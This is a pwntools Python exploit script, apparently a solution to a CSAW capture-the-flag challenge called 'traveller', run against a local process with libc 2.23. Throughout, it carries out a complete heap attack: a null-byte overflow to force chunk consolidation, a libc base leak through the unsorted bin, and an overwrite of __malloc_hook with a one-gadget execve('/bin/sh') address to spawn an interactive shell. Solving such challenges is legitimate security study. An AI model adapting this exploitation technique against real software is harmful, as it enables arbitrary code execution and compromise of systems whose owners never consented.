from __future__ import print_function
from pwn import *

#target = remote("pwn.chal.csaw.io", 1003)
target = process("./traveller", env = {"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)

libc = ELF("libc-2.23.so")

def pl():
	print(target.recvuntil(">"))

'''
1. 0x80 
2. 0x110 
3. 0x128 
4. 0x150 
5. 0x200 
'''
def add(size, content):
	pl()
	target.sendline("1")
	#pl()
	target.sendline(str(size))
	#print target.recvuntil("Destination")
	target.sendline(content)

def edit(index, content):
	pl()
	target.sendline("2")
	#pl()
	target.sendline(str(index))
	raw_input()
	#print target.recvuntil("Destination")
	target.sendline(content)

def delete(index):
	pl()
	target.sendline("3")
	#pl()
	target.sendline(str(index))
	#print target.recvuntil("Destination")

def show(index):
	pl()
	target.sendline("4")
	#pl()
	target.sendline(str(index))
	#print target.recvuntil("Destination")

# allocate / free some chunks to get 0x10 byte chunks out of the way
add(1, "x"*8)
add(1, "x"*8)
add(1, "x"*8)
add(1, "x"*8)

delete(0)
delete(0)
delete(0)
delete(0)

# Allocate our four chunks which will be right next to each other in memory
add(2, "0"*8)# 0
add(3, "1"*8)# 1
add(2, "2"*8)# 2
add(5, "3"*8)# 3


# Free the first chunk
delete(0)# 0 

# Edit the second chunk, execute null byte overflow against third 
edit(1, "8"*0x120 + p64(0x250))# 1 

# Setup fake chunk in the third chunk to pass malloc checks
edit(2, "0"*0xf0 + p64(0) + p64(0x231))# 2

# free the third chunk, cause the heap consolidation
delete(2)# 2

# Bring the start of the unsorted bin up to our first chunk, which we can still write to
add(2, "4"*8)

# Get the libc infoleak

pl()
pl()
pl()
pl()
pl()
pl()
pl()
pl()
pl()
pl()
pl()

target.sendline("4")
target.sendline("1")
print(target.recvuntil(">"))

leak = target.recvline().strip("\n").strip("\x20")
leak = u64(leak + "\x00"*(8 - len(leak)))
libcBase = leak - 0x3c4b78

print("libcBase: " + hex(libcBase))

# Add chunks to get 0x10 byte chunk overlapping with our first chunk

add(1, "5"*8)

add(1, "6"*8)

# Overwrite ptr of 0x10 byte chunk with that of the malloc hook
edit(1, p64(libcBase + libc.symbols["__malloc_hook"]))

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

# Overwrite malloc hook chunk with oneshot gadget
edit(4, p64(libcBase + 0xf1147))

# Call malloc to get a shell
add(1, "g0ttem_b0yz")

# Enjoy your shell!
target.interactive()